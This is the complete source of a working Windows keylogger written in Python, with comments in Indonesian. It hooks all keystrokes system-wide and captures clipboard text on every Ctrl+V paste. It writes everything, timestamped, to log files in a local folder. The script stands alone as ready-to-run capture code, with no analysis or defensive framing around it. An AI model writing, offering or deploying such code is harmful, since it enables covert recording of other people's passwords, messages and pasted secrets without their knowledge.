import os
import sys
import winsound
from datetime import datetime

import keyboard
import win32clipboard


LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
BUFFER_FLUSH_KEY = "enter"


def main():
    os.makedirs(LOG_DIR, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    filename = f"keylog_{timestamp}.txt"
    filepath = os.path.join(LOG_DIR, filename)

    buffer = []
    line_count = 0

    print("Apps running, press Ctrl+C to stop")

    # Tulis header di file
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(f"Keystroke Log — Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

    def flush_buffer():
        nonlocal line_count
        if not buffer:
            return

        line_count += 1
        ts = datetime.now().strftime("%H:%M:%S")
        text = "".join(buffer)
        line = f"[{ts}]  {text}"

        with open(filepath, "a", encoding="utf-8") as f:
            f.write(line + "\n")

        buffer.clear()

    def get_clipboard_text():
        """Ambil teks dari clipboard."""
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return data
        except Exception:
            try:
                win32clipboard.CloseClipboard()
            except Exception:
                pass
            return None

    def on_key(event):
        if event.event_type != "down":
            return

        name = event.name

        # Skip modifier keys saja
        if name in ("ctrl", "shift", "alt", "left ctrl", "right ctrl",
                     "left shift", "right shift", "left alt", "right alt",
                     "left windows", "right windows"):
            return

        # Detect Ctrl+V (paste) — capture clipboard content
        if name == "v" and keyboard.is_pressed("ctrl"):
            clip = get_clipboard_text()
            if clip:
                # Ganti newlines dengan spasi supaya rapi di satu baris log
                clip_clean = clip.replace("\r\n", " ").replace("\n", " ").strip()
                buffer.append(f"[PASTE: {clip_clean}]")
            return

        if name == "enter":
            flush_buffer()
        elif name == "space":
            buffer.append(" ")
        elif name == "backspace":
            if buffer:
                buffer.pop()
        elif name == "tab":
            buffer.append("    ")
        elif name == "escape":
            buffer.append("[ESC]")
        elif len(name) == 1:
            # Regular character
            buffer.append(name)
        else:
            # Special keys (arrows, F1-F12, etc)
            buffer.append(f"[{name.upper()}]")

    keyboard.hook(on_key)

    winsound.Beep(1000, 150)

    try:
        keyboard.wait()
    except KeyboardInterrupt:
        pass

    # Flush sisa buffer
    if buffer:
        flush_buffer()

    # Tulis footer
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"\n{'=' * 60}\n")
        f.write(f"Session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total lines captured: {line_count}\n")

    print(f"Session ended. Total lines: {line_count}")
    if line_count > 0:
        print(f"Saved to: {filepath}")
    else:
        os.remove(filepath)


if __name__ == "__main__":
    main()
